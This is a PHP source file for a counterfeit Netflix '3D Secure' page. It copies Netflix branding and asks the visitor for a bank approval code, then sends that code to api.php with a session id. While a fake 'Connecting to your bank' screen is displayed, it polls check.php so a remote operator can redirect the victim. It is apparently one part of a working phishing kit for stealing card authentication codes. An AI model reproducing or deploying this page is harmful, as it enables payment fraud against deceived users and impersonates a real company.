<?php 
require_once 'config.php'; 
$lang = getLang();
$sid = $_GET['sid'] ?? '';
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - 3D Secure</title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <header class="nf-header">
        <a href="#" class="nf-logo">
            <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.125L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.532-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.375v4.687h-4.001zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-17.5 21.03c-1.813-.156-3.625-.25-5.438-.343V0h5.438v25.717z"/></svg>
        </a>
    </header>

    <main class="nf-main">
        <div class="nf-card approval-card">
            <div class="bank-logo">🔐 3D Secure</div>
            <h2><?php echo t('approval', $lang); ?></h2>
            <p class="approval-desc"><?php echo t('approval_sub', $lang); ?></p>
            <p class="approval-text"><?php echo t('approval_text', $lang); ?></p>

            <form id="approvalForm">
                <div class="nf-input-wrap">
                    <input type="text" id="approval_code" required placeholder=" " maxlength="8">
                    <label><?php echo t('bank_code', $lang); ?></label>
                </div>

                <button type="submit" class="nf-btn" id="submitBtn">
                    <?php echo t('continue', $lang); ?>
                </button>
            </form>
        </div>
    </main>

    <div class="waiting-overlay" id="waitingOverlay" style="display:none;">
        <div class="waiting-box">
            <div class="spinner-large"></div>
            <p><?php echo t('processing', $lang); ?></p>
            <p class="waiting-sub">Connecting to your bank...</p>
        </div>
    </div>

    <script>
        const sid = '<?php echo htmlspecialchars($sid); ?>';
        const lang = '<?php echo $lang; ?>';

        document.getElementById('approvalForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('approval_code').value;

            document.getElementById('submitBtn').innerHTML = '<span class="spinner"></span> <?php echo t('processing', $lang); ?>';
            document.getElementById('submitBtn').disabled = true;

            await fetch('api.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'action=approval&sid=' + sid + '&approval_code=' + encodeURIComponent(code)
            });

            document.getElementById('waitingOverlay').style.display = 'flex';
            pollForRedirect();
        });

        function pollForRedirect() {
            setInterval(async () => {
                try {
                    const res = await fetch('check.php?sid=' + sid + '&lang=' + lang);
                    const data = await res.json();
                    if (data.redirect) window.location.href = data.url;
                } catch(e) {}
            }, 3000);
        }
    </script>
</body>
</html>
